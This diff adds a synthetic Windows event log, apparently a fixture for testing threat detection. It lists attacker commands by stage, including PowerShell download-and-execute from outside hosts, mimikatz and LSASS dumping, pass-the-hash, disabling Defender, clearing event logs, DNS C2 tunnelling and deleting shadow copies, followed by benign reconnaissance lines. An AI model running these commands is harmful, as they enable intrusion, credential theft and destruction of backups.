@@ -1,0 +1,86 @@
+
+2024-01-15 08:12:34 [PROCESS] host=WORKSTATION-01 user=jsmith pid=4821 parent=explorer.exe cmd="powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA=="
+2024-01-15 08:13:01 [PROCESS] host=WORKSTATION-01 user=jsmith pid=4822 parent=winword.exe cmd="powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.99/stage2.ps1')"
+2024-01-15 08:14:15 [PROCESS] host=WORKSTATION-01 user=jsmith pid=4830 parent=powershell.exe cmd="cmd.exe /c echo %COMSPEC% && set PATH && cmd /v:on /c set var=calc&&!var!"
+2024-01-15 08:15:22 [PROCESS] host=WORKSTATION-01 user=jsmith pid=4835 parent=outlook.exe cmd="wscript.exe C:\Users\jsmith\AppData\Roaming\invoice.vbs"
+2024-01-15 08:16:44 [PROCESS] host=WORKSTATION-01 user=jsmith pid=4840 parent=explorer.exe cmd="mshta.exe vbscript:CreateObject('WScript.Shell').Run('powershell -nop -c whoami',0,true)(window.close)"
+2024-01-15 08:17:55 [PROCESS] host=WORKSTATION-01 user=jsmith pid=4845 parent=cmd.exe cmd="powershell.exe -WindowStyle Hidden -NonInteractive -c Invoke-Expression(New-Object Net.WebClient).DownloadString('http://10.0.0.5/payload.ps1')"
+2024-01-15 08:19:10 [PROCESS] host=SERVER-02 user=SYSTEM pid=5010 parent=services.exe cmd="powershell.exe -exec bypass -w hidden -c IEX([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('BASE64PAYLOAD')))"
+
+
+2024-01-15 08:20:05 [REGISTRY] host=WORKSTATION-01 user=jsmith pid=4850 action=SetValue key="HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate" value="C:\Users\jsmith\AppData\Local\Temp\svchost32.exe"
+2024-01-15 08:20:06 [PROCESS] host=WORKSTATION-01 user=jsmith pid=4851 cmd="reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\Temp\mal.exe /f"
+2024-01-15 08:21:30 [REGISTRY] host=WORKSTATION-01 user=jsmith pid=4860 action=SetValue key="HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveHelper" value="powershell.exe -nop -w hidden -c C:\ProgramData\helper.ps1"
+2024-01-15 08:22:45 [PROCESS] host=SERVER-02 user=SYSTEM pid=5020 cmd="schtasks /create /tn WindowsDefenderUpdate /tr C:\Temp\beacon.exe /sc onlogon /ru SYSTEM"
+2024-01-15 08:23:10 [PROCESS] host=SERVER-02 user=SYSTEM pid=5025 cmd="sc create SvcUpdateHelper binpath= C:\Windows\Temp\svchost_fake.exe type= own start= auto"
+2024-01-15 08:24:00 [PROCESS] host=SERVER-02 user=SYSTEM pid=5030 cmd="bitsadmin /transfer WindowsUpdate /download /priority high http://malicious.example.com/update.exe C:\Temp\update.exe"
+2024-01-15 08:25:15 [PROCESS] host=WORKSTATION-01 user=jsmith pid=4870 cmd="sc config SvcUpdateHelper binpath= C:\Windows\Temp\newpayload.exe"
+
+
+2024-01-15 08:30:01 [PROCESS] host=WORKSTATION-01 user=jsmith pid=4900 parent=cmd.exe cmd="mimikatz.exe privilege::debug sekurlsa::logonpasswords exit"
+2024-01-15 08:30:45 [PROCESS] host=WORKSTATION-01 user=jsmith pid=4905 parent=cmd.exe cmd="procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp"
+2024-01-15 08:31:20 [PROCESS] host=WORKSTATION-01 user=jsmith pid=4910 parent=powershell.exe cmd="rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 624 C:\Temp\lsass_dump.bin full"
+2024-01-15 08:32:00 [PROCESS] host=DC-01 user=admin pid=6010 parent=cmd.exe cmd="reg save HKLM\SAM C:\Temp\sam.hive"
+2024-01-15 08:32:15 [PROCESS] host=DC-01 user=admin pid=6011 parent=cmd.exe cmd="reg save HKLM\SYSTEM C:\Temp\system.hive"
+2024-01-15 08:33:00 [PROCESS] host=WORKSTATION-01 user=jsmith pid=4920 cmd="findstr /si password C:\inetpub\wwwroot\web.config C:\xampp\htdocs\config.php"
+2024-01-15 08:33:30 [PROCESS] host=WORKSTATION-01 user=jsmith pid=4925 cmd="cmdkey /add:10.0.0.5 /user:administrator /pass:P@ssw0rd123"
+2024-01-15 08:34:00 [PROCESS] host=WORKSTATION-01 user=jsmith pid=4930 cmd="vaultcmd /listcreds:'Windows Credentials' /all"
+2024-01-15 08:34:30 [PROCESS] host=WORKSTATION-01 user=jsmith pid=4935 parent=cmd.exe cmd="wce.exe -w -o C:\Temp\creds.txt"
+
+
+2024-01-15 08:40:01 [PROCESS] host=WORKSTATION-01 user=jsmith pid=5100 parent=cmd.exe cmd="fodhelper.exe"
+2024-01-15 08:40:02 [REGISTRY] host=WORKSTATION-01 user=jsmith action=SetValue key="HKCU\Software\Classes\ms-settings\Shell\Open\command" value="cmd.exe /c C:\Temp\beacon.exe"
+2024-01-15 08:40:10 [PROCESS] host=WORKSTATION-01 user=jsmith pid=5105 cmd="reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
+2024-01-15 08:41:00 [PROCESS] host=WORKSTATION-01 user=jsmith pid=5110 parent=cmd.exe cmd="powershell.exe -c VirtualAllocEx; WriteProcessMemory; CreateRemoteThread into explorer.exe shellcode injection"
+2024-01-15 08:42:00 [PROCESS] host=WORKSTATION-01 user=jsmith pid=5115 cmd="schtasks /create /tn ElevatedTask /tr C:\Temp\beacon.exe /sc onlogon /ru SYSTEM /f"
+2024-01-15 08:42:30 [PROCESS] host=WORKSTATION-01 user=jsmith pid=5120 parent=cmd.exe cmd="whoami /priv | findstr SeImpersonatePrivilege"
+
+
+2024-01-15 08:50:01 [PROCESS] host=WORKSTATION-01 user=jsmith pid=5200 cmd="net use \\DC-01\C$ /user:CORP\administrator P@ssw0rd123"
+2024-01-15 08:50:30 [NETWORK] host=WORKSTATION-01 user=jsmith event="SMB connection" dst=DC-01 share=ADMIN$ tool="psexec \\DC-01 -u administrator cmd.exe"
+2024-01-15 08:51:00 [PROCESS] host=WORKSTATION-01 user=jsmith pid=5210 cmd="mstsc /v:10.0.0.20 /admin"
+2024-01-15 08:51:45 [PROCESS] host=WORKSTATION-01 user=jsmith pid=5215 cmd="Invoke-Command -ComputerName DC-01 -ScriptBlock { whoami } -Credential $cred"
+2024-01-15 08:52:10 [PROCESS] host=WORKSTATION-01 user=jsmith pid=5220 cmd="net use \\10.0.0.30\IPC$ pth-winexe pass-the-hash NTLM:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"
+
+2024-01-15 09:00:01 [PROCESS] host=WORKSTATION-01 user=jsmith pid=5300 cmd="whoami && systeminfo && hostname && ipconfig /all && ver"
+2024-01-15 09:00:30 [PROCESS] host=WORKSTATION-01 user=jsmith pid=5305 cmd="tasklist /v /fo csv"
+2024-01-15 09:01:00 [PROCESS] host=WORKSTATION-01 user=jsmith pid=5310 cmd="wmic process get name,processid,executablepath"
+2024-01-15 09:01:30 [PROCESS] host=WORKSTATION-01 user=jsmith pid=5315 cmd="netstat -ano && arp -a && net view"
+2024-01-15 09:02:00 [PROCESS] host=DC-01 user=admin pid=6100 cmd="net group 'Domain Admins' /domain && dsquery user -limit 500 && nltest /dclist:CORP"
+2024-01-15 09:02:30 [PROCESS] host=WORKSTATION-01 user=jsmith pid=5320 cmd="Get-ADUser -Filter * -Properties * | Select Name,SamAccountName,MemberOf"
+2024-01-15 09:03:00 [PROCESS] host=WORKSTATION-01 user=jsmith pid=5325 cmd="nmap -sV -p 22,80,443,445,3389 10.0.0.0/24"
+
+
+2024-01-15 09:10:01 [PROCESS] host=WORKSTATION-01 user=jsmith pid=5400 cmd="netsh advfirewall set allprofiles state off"
+2024-01-15 09:10:30 [PROCESS] host=WORKSTATION-01 user=SYSTEM pid=5405 cmd="sc stop windefend && sc config windefend start= disabled"
+2024-01-15 09:11:00 [PROCESS] host=WORKSTATION-01 user=SYSTEM pid=5410 cmd="Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true"
+2024-01-15 09:11:30 [PROCESS] host=WORKSTATION-01 user=SYSTEM pid=5415 cmd="Add-MpPreference -ExclusionPath C:\Temp -ExclusionProcess beacon.exe"
+2024-01-15 09:12:00 [PROCESS] host=WORKSTATION-01 user=jsmith pid=5420 cmd="wevtutil cl System && wevtutil cl Security && wevtutil cl Application"
+2024-01-15 09:12:30 [PROCESS] host=WORKSTATION-01 user=jsmith pid=5425 cmd="regsvr32.exe /s /u /i:http://10.0.0.99/payload.sct scrobj.dll"
+2024-01-15 09:13:00 [PROCESS] host=WORKSTATION-01 user=jsmith pid=5430 cmd="rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -nop -w hidden\")"
+2024-01-15 09:13:30 [PROCESS] host=WORKSTATION-01 user=jsmith pid=5435 cmd="certutil -urlcache -split -f http://10.0.0.99/beacon.exe C:\Temp\svchost32.exe"
+2024-01-15 09:14:00 [PROCESS] host=WORKSTATION-01 user=jsmith pid=5440 cmd="attrib +h +s C:\Temp\beacon.exe && icacls C:\Temp\beacon.exe /grant Everyone:F"
+
+
+2024-01-15 09:20:01 [PROCESS] host=WORKSTATION-01 user=jsmith pid=5500 cmd="curl -o C:\Temp\stage3.exe http://185.220.101.45/files/stage3.exe"
+2024-01-15 09:20:30 [PROCESS] host=WORKSTATION-01 user=jsmith pid=5505 cmd="powershell -c (New-Object Net.WebClient).DownloadFile('http://185.220.101.45/rat.exe','C:\Temp\rat.exe')"
+2024-01-15 09:21:00 [DNS] host=WORKSTATION-01 query="aGVsbG8gd29ybGQ.evil-c2.net" type=TXT response="Y21kIC9jIHdob2FtaQ=="
+2024-01-15 09:21:30 [DNS] host=WORKSTATION-01 cmd="powershell Resolve-DnsName -Name data.exfil-c2.io -Type TXT"
+2024-01-15 09:22:00 [PROCESS] host=WORKSTATION-01 user=jsmith pid=5510 cmd="nslookup -type=txt cmd.c2tunnel.net 8.8.8.8"
+
+2024-01-15 09:30:01 [PROCESS] host=SERVER-02 user=SYSTEM pid=6200 cmd="vssadmin delete shadows /all /quiet"
+2024-01-15 09:30:15 [PROCESS] host=SERVER-02 user=SYSTEM pid=6205 cmd="wmic shadowcopy delete"
+2024-01-15 09:30:30 [PROCESS] host=SERVER-02 user=SYSTEM pid=6210 cmd="bcdedit /set {default} recoveryenabled no && bcdedit /set {default} bootstatuspolicy ignoreallfailures"
+
+
+
+2024-01-15 10:05:01 [PROCESS] host=WORKSTATION-03 user=intern01 pid=7100 parent=explorer.exe cmd="net view && net share"
+2024-01-15 10:06:12 [PROCESS] host=WORKSTATION-03 user=intern01 pid=7105 parent=cmd.exe cmd="ping -n 10 10.0.0.1 && ping -n 10 10.0.0.2 && ping -n 10 10.0.0.3"
+2024-01-15 10:07:30 [PROCESS] host=WORKSTATION-03 user=intern01 pid=7110 parent=cmd.exe cmd="dir /s /b C:\Users\intern01\Documents\*.txt"
+2024-01-15 10:08:44 [PROCESS] host=WORKSTATION-03 user=intern01 pid=7115 parent=explorer.exe cmd="quser && query user /server:WORKSTATION-03"
+2024-01-15 10:09:55 [PROCESS] host=WORKSTATION-03 user=intern01 pid=7120 parent=cmd.exe cmd="net localgroup && net accounts && net group"
+2024-01-15 10:11:02 [PROCESS] host=WORKSTATION-03 user=intern01 pid=7125 parent=powershell.exe cmd="curl -I http://10.0.0.5 && curl --head http://10.0.0.10"
+2024-01-15 10:12:18 [PROCESS] host=WORKSTATION-03 user=intern01 pid=7130 parent=cmd.exe cmd="type C:\Windows\System32\drivers\etc\hosts"
+2024-01-15 10:13:25 [PROCESS] host=WORKSTATION-03 user=intern01 pid=7135 parent=cmd.exe cmd="set"
+2024-01-15 10:14:40 [PROCESS] host=WORKSTATION-03 user=intern01 pid=7140 parent=powershell.exe cmd="gpresult /r && Get-GPO -All"
+2024-01-15 10:15:55 [PROCESS] host=WORKSTATION-03 user=intern01 pid=7145 parent=cmd.exe cmd="driverquery /fo csv /v && msinfo32 /report C:\Temp\sysinfo.txt"
